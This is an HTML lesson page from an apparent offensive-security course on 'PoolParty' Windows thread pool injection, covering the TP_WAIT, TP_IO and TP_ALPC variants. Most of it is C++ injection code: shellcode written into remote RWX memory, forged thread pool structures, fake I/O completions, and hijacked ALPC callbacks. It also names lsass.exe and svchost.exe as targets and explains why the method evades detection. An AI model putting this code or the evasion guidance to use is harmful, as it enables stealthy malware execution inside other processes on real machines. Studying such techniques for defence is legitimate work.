@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: Wait, I/O &amp; ALPC Variants - PoolParty Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F3CA;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f59e0b;--accent2:#d97706;--gradient:linear-gradient(135deg,#f59e0b,#d97706)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>PoolParty Course</h2>
+<span>Thread Pool Injection Masterclass</span>
+</div>
+<a class="home-link" href="../PoolParty_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Injection Landscape</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Thread Pool Architecture</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Thread Pool Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Worker Factory &amp; TP_WORK</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module5.html"><span>5. Wait, I/O &amp; ALPC</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Job &amp; Direct Variants</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. TP_TIMER Insertion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 5: Wait, I/O &amp; ALPC Variants</h1>
+<p class="subtitle">PoolParty Variants 3&ndash;5: TP_WAIT insertion with event signaling, TP_IO exploitation via NtSetIoCompletion, and TP_ALPC port abuse for callback triggering.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how PoolParty Variant 3 injects a crafted TP_WAIT item into the target process and signals its wait object to trigger callback execution, how Variant 4 exploits the I/O completion mechanism by posting a fake I/O completion to the pool&rsquo;s IOCP via <code>NtSetIoCompletion</code>, and how Variant 5 abuses ALPC ports bound to the thread pool to trigger callback execution by sending an ALPC message.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Variant 3: TP_WAIT Insertion</h2>
+
+<p>The Windows thread pool supports wait callbacks: a function is called when a kernel object (event, semaphore, mutex, process handle) becomes signaled. Internally, the wait subsystem uses <code>NtWaitForMultipleObjects</code> in a dedicated waiter thread to monitor registered objects.</p>
+
+<table>
+<tr><th>Component</th><th>Description</th></tr>
+<tr><td><strong>TP_WAIT</strong></td><td>Structure representing a registered wait callback</td></tr>
+<tr><td><strong>WaitObject</strong></td><td>The kernel handle being waited on</td></tr>
+<tr><td><strong>Waiter Thread</strong></td><td>Dedicated thread calling <code>NtWaitForMultipleObjects</code></td></tr>
+<tr><td><strong>Dispatch</strong></td><td>When the object signals, callback is posted to IOCP</td></tr>
+</table>
+
+<p>Variant 3 creates a <code>TP_WAIT</code> structure in the target process with the callback pointing to shellcode, creates a shared event handle in the target, registers the wait, and then signals the event from the attacking process. This triggers the waiter thread to dispatch the callback.</p>
+
+<div class="diagram">
+<h4>Variant 3 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Create event<br><small>In target process</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Craft TP_WAIT<br><small>Callback = shellcode</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Register wait<br><small>TpSetWait on event</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Signal event<br><small>From attacker</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Shellcode fires<br><small>Via worker thread</small></div>
+</div>
+</div>
+
+<h3>1.1 Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 3: TP_WAIT Insertion
+
+// Step 1: Allocate and write shellcode
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Create an event in the target process
+// We create it in our process and duplicate into target
+HANDLE localEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+HANDLE remoteEvent;
+DuplicateHandle(GetCurrentProcess(), localEvent,
+                hProcess, &remoteEvent,
+                0, FALSE, DUPLICATE_SAME_ACCESS);
+
+// Step 3: Craft a TP_WAIT structure
+TP_WAIT fakeWait = { 0 };
+fakeWait.Task.WorkCallback = (PTP_WORK_CALLBACK)remoteShellcode;
+fakeWait.Task.Context = NULL;
+fakeWait.Pool = (PTP_POOL)targetPoolPtr;
+fakeWait.WaitObject = remoteEvent;
+
+// Step 4: Write the fake wait item into target
+LPVOID remoteWait = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteWait, &fakeWait,
+                   sizeof(TP_WAIT), NULL);
+
+// Step 5: Insert into the pool's wait list
+InsertWaitIntoTargetList(hProcess, targetPoolPtr, remoteWait);
+
+// Step 6: Signal the event to trigger the callback
+// The waiter thread detects the signal and dispatches
+SetEvent(localEvent);
+// OR use NtSignalAndWaitForSingleObject for atomicity</code></pre>
+
+<h3>1.2 Using NtSignalAndWaitForSingleObject</h3>
+
+<p>For more precise control, PoolParty can use <code>NtSignalAndWaitForSingleObject</code> to atomically signal the event and wait for a confirmation that the callback has been dispatched:</p>
+
+<pre><span class="lang-tag">C++</span><code>// Atomic signal-and-wait for precise triggering
+HANDLE hConfirmEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+
+NtSignalAndWaitForSingleObject(
+    localEvent,           // Signal this (triggers the TP_WAIT callback)
+    hConfirmEvent,        // Wait on this (confirmation from shellcode)
+    FALSE,                // Not alertable
+    NULL                  // No timeout
+);</code></pre>
+
+<!-- ============================================================ -->
+<h2>2. Variant 4: TP_IO Insertion</h2>
+
+<p>The Windows thread pool can manage asynchronous I/O callbacks. When an application binds a file handle to the thread pool, I/O completions on that handle are automatically dispatched as callbacks on worker threads. Variant 4 exploits this by posting a fake I/O completion packet directly to the IOCP.</p>
+
+<div class="diagram">
+<h4>Normal TP_IO Flow</h4>
+<div class="flow">
+<div class="flow box">TpAllocIoCompletion<br><small>Bind file to pool</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Async I/O issued<br><small>ReadFile / WriteFile</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">I/O completes<br><small>Kernel posts to IOCP</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback fires<br><small>Worker thread</small></div>
+</div>
+</div>
+
+<p>Variant 4 does not actually need a real file handle or a real I/O operation. Because the thread pool dispatches I/O callbacks based on completion packets arriving at the IOCP, the attacker can simply <strong>post a fake I/O completion packet</strong> directly to the IOCP. The worker thread cannot distinguish this from a real I/O completion.</p>
+
+<div class="diagram">
+<h4>Variant 4 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Write shellcode<br><small>+ craft TP_IO</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Post fake I/O<br><small>NtSetIoCompletion</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Worker wakes<br><small>Thinks I/O completed</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback fires<br><small>Shellcode runs</small></div>
+</div>
+</div>
+
+<h3>2.1 Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 4: TP_IO via NtSetIoCompletion
+
+// Step 1: Allocate and write shellcode in target
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Craft a TP_IO structure in the target process
+TP_IO fakeIo = { 0 };
+fakeIo.Task.WorkCallback = (PTP_WORK_CALLBACK)remoteShellcode;
+fakeIo.Task.Context = NULL;
+fakeIo.Pool = (PTP_POOL)targetPoolPtr;
+fakeIo.PendingCount = 1;  // Simulate one pending operation
+
+LPVOID remoteIo = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteIo, &fakeIo,
+                   sizeof(TP_IO), NULL);
+
+// Step 3: Duplicate the target's IOCP into our process
+HANDLE localIocp;
+DuplicateHandle(hProcess, targetIocpHandle,
+                GetCurrentProcess(), &localIocp,
+                0, FALSE, DUPLICATE_SAME_ACCESS);
+
+// Step 4: Post a fake I/O completion packet
+// The CompletionKey encodes the TP_IO pointer
+// The worker thread will extract it and call the callback
+NtSetIoCompletion(
+    localIocp,
+    (ULONG_PTR)remoteIo,    // CompletionKey = TP_IO pointer
+    NULL,                     // ApcContext (overlapped)
+    STATUS_SUCCESS,           // IoStatusBlock.Status
+    0                         // IoStatusBlock.Information
+);
+
+// A worker thread wakes, decodes the TP_IO from CompletionKey,
+// and calls fakeIo.Task.WorkCallback = our shellcode</code></pre>
+
+<div class="card green">
+<h4>Variant 4 Elegance</h4>
+<p>This variant is remarkably clean: <code>NtSetIoCompletion</code> is a common, legitimate API called millions of times per second across the system. It is used by every application that performs async I/O. Posting a single completion packet is an operation with zero suspicious characteristics, yet it achieves code execution in the target process.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Variant 5: TP_ALPC Insertion</h2>
+
+<p>Advanced Local Procedure Call (ALPC) is the primary inter-process communication mechanism in Windows. Many Windows services expose ALPC ports that client processes connect to. The thread pool can be bound to an ALPC port, so incoming ALPC messages automatically trigger callbacks on worker threads.</p>
+
+<table>
+<tr><th>ALPC Component</th><th>Description</th></tr>
+<tr><td><strong>ALPC Port</strong></td><td>Kernel object for IPC; server creates a connection port, clients connect to get communication ports</td></tr>
+<tr><td><strong>TP_ALPC</strong></td><td>Thread pool structure binding an ALPC port to a callback</td></tr>
+<tr><td><strong>TpAllocAlpcCompletion</strong></td><td>Internal API to bind an ALPC port to the thread pool</td></tr>
+<tr><td><strong>Message dispatch</strong></td><td>Incoming ALPC messages trigger the registered callback via IOCP</td></tr>
+</table>
+
+<p>Variant 5 finds an ALPC port in the target process that is bound to the thread pool, then sends an ALPC message to that port. The arrival of the message triggers the TP_ALPC callback dispatch. The attacker replaces the callback with shellcode before sending the message.</p>
+
+<div class="diagram">
+<h4>Variant 5 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Find ALPC port<br><small>Handle enumeration</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Write shellcode<br><small>+ modify TP_ALPC</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Connect to port<br><small>NtAlpcConnectPort</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Send message<br><small>NtAlpcSendWaitReceivePort</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback fires<br><small>Shellcode runs</small></div>
+</div>
+</div>
+
+<h3>3.1 Finding the Target ALPC Port</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 5: ALPC Port Discovery
+
+// ALPC ports that are bound to the thread pool have their
+// CompletionPort set to the pool's IOCP. We can find them
+// by enumerating handles and checking the ALPC association.
+
+for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+    SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
+    if (entry.UniqueProcessId != targetPid) continue;
+    if (entry.ObjectTypeIndex != alpcPortTypeIndex) continue;
+
+    // Duplicate and query the ALPC port
+    HANDLE dupPort;
+    DuplicateHandle(hProcess, (HANDLE)(ULONG_PTR)entry.HandleValue,
+                    GetCurrentProcess(), &dupPort,
+                    0, FALSE, DUPLICATE_SAME_ACCESS);
+
+    // Check if this ALPC port is associated with the pool's IOCP
+    ALPC_COMPLETION_PORT_INFORMATION acpi;
+    NtAlpcQueryInformation(dupPort,
+        AlpcAssociateCompletionPortInformation,
+        &acpi, sizeof(acpi), NULL);
+
+    if (acpi.CompletionPort == targetIocpHandle) {
+        // This ALPC port is bound to the thread pool
+        targetAlpcPort = dupPort;
+        targetAlpcCompletionKey = acpi.CompletionKey;
+        break;
+    }
+}</code></pre>
+
+<h3>3.2 Overwriting the TP_ALPC Callback and Triggering</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Step 1: Allocate and write shellcode
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Overwrite the TP_ALPC callback pointer with shellcode address
+PVOID callbackAddr = &((PTP_ALPC)targetAlpcCompletionKey)->Task.WorkCallback;
+WriteProcessMemory(hProcess, callbackAddr,
+                   &remoteShellcode, sizeof(PVOID), NULL);
+
+// Step 3: Connect to the target's ALPC port and send a message
+HANDLE clientPort = NULL;
+ALPC_PORT_ATTRIBUTES portAttrs = { 0 };
+portAttrs.MaxMessageLength = sizeof(PORT_MESSAGE) + 0x100;
+
+SIZE_T bufLen = sizeof(PORT_MESSAGE);
+PORT_MESSAGE connectMsg = { 0 };
+connectMsg.u1.s1.TotalLength = (USHORT)bufLen;
+connectMsg.u1.s1.DataLength = 0;
+
+NtAlpcConnectPort(
+    &clientPort, &targetPortName, NULL, &portAttrs,
+    0, NULL, &connectMsg, &bufLen, NULL, NULL, NULL);
+
+// Send a message to trigger the callback
+PORT_MESSAGE sendMsg = { 0 };
+sendMsg.u1.s1.TotalLength = sizeof(PORT_MESSAGE);
+sendMsg.u1.s1.DataLength = 0;
+
+NtAlpcSendWaitReceivePort(clientPort, 0, &sendMsg,
+    NULL, NULL, NULL, NULL, NULL);
+
+// The ALPC message arrival causes the kernel to post a
+// completion packet to the pool's IOCP, which wakes a
+// worker thread that calls our modified callback = shellcode</code></pre>
+
+<div class="card warn">
+<h4>Variant 5 Limitation</h4>
+<p>Not all processes have ALPC ports bound to their thread pools. This variant is most effective against <strong>RPC server processes</strong> (like <code>svchost.exe</code> hosting RPC services, <code>lsass.exe</code>, etc.) that naturally use ALPC for client communication. Variant 4 is more universally applicable since every thread pool has an IOCP.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Comparison: Variants 3, 4, and 5</h2>
+
+<table>
+<tr><th>Property</th><th>Variant 3 (TP_WAIT)</th><th>Variant 4 (TP_IO)</th><th>Variant 5 (TP_ALPC)</th></tr>
+<tr><td><strong>Trigger</strong></td><td>Event signal</td><td>Post fake IOCP packet</td><td>Send ALPC message</td></tr>
+<tr><td><strong>Key API</strong></td><td><code>SetEvent</code> / <code>NtSignalAndWaitForSingleObject</code></td><td><code>NtSetIoCompletion</code></td><td><code>NtAlpcSendWaitReceivePort</code></td></tr>
+<tr><td><strong>Prerequisite</strong></td><td>Duplicated event handle</td><td>Know the target&rsquo;s IOCP handle</td><td>Find ALPC port bound to pool</td></tr>
+<tr><td><strong>Applicability</strong></td><td>Any process with a thread pool</td><td>Any process with a thread pool</td><td>Only processes with ALPC-bound pools (RPC servers)</td></tr>
+<tr><td><strong>Dispatch path</strong></td><td>Waiter thread &rarr; IOCP &rarr; worker</td><td>Direct IOCP post &rarr; worker</td><td>ALPC &rarr; IOCP &rarr; worker</td></tr>
+<tr><td><strong>Stealth</strong></td><td>Wait callbacks are ubiquitous</td><td>NtSetIoCompletion is extremely common</td><td>ALPC connections are common for IPC</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>5. Why These Variants Evade Detection</h2>
+
+<div class="card green">
+<h4>Clean Execution Context</h4>
+<p>When a wait, I/O, or ALPC callback fires through the thread pool, the resulting call stack is indistinguishable from legitimate application behavior:</p>
+<ul>
+<li>The thread is a standard worker thread started by <code>TppWorkerThread</code></li>
+<li>The callback dispatch goes through the documented <code>TppWaitpExecuteCallback</code>, <code>TppIopExecuteCallback</code>, or <code>TppAlpcpExecuteCallback</code> path</li>
+<li>No <code>CreateRemoteThread</code>, no <code>QueueUserAPC</code>, no suspicious API in the stack</li>
+<li>The triggering APIs (<code>SetEvent</code>, <code>NtSetIoCompletion</code>, <code>NtAlpcSendWaitReceivePort</code>) are common, high-volume operations</li>
+</ul>
+</div>
+
+<div class="card">
+<h4>Legitimate Call Stack Example</h4>
+<pre><span class="lang-tag">Call Stack</span><code>shellcode!main                          ; Our code - looks like a callback
+ntdll!TppWorkpExecuteCallback+0x131
+ntdll!TppWorkerThread+0x69f
+kernel32!BaseThreadInitThunk+0x14
+ntdll!RtlUserThreadStart+0x21</code></pre>
+<p>This call stack is identical to any legitimate thread pool callback. There is no indicator that the callback was injected rather than registered by the application itself.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: How does the attacker trigger execution in Variant 3 (TP_WAIT)?</p>
+<div class="quiz-btn" data-choice="A">A) By creating a remote thread</div>
+<div class="quiz-btn" data-choice="B">B) By posting to the IOCP directly</div>
+<div class="quiz-btn" data-choice="C">C) By signaling the duplicated event handle from the attacker process</div>
+<div class="quiz-btn" data-choice="D">D) By modifying the thread context</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: What makes NtSetIoCompletion (Variant 4) particularly effective for injection?</p>
+<div class="quiz-btn" data-choice="A">A) It bypasses kernel security checks</div>
+<div class="quiz-btn" data-choice="B">B) It executes code in kernel mode</div>
+<div class="quiz-btn" data-choice="C">C) It is an undocumented API</div>
+<div class="quiz-btn" data-choice="D">D) It is an extremely common API that is not monitored as an injection vector</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: What type of processes are most suitable targets for Variant 5 (TP_ALPC)?</p>
+<div class="quiz-btn" data-choice="A">A) Any process with a GUI window</div>
+<div class="quiz-btn" data-choice="B">B) RPC server processes that use ALPC ports bound to their thread pool</div>
+<div class="quiz-btn" data-choice="C">C) Only SYSTEM-level processes</div>
+<div class="quiz-btn" data-choice="D">D) Processes with debugging enabled</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Prev: Worker Factory &amp; TP_WORK</a>
+<a class="primary" href="module6.html">Next: Job &amp; Direct Variants &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
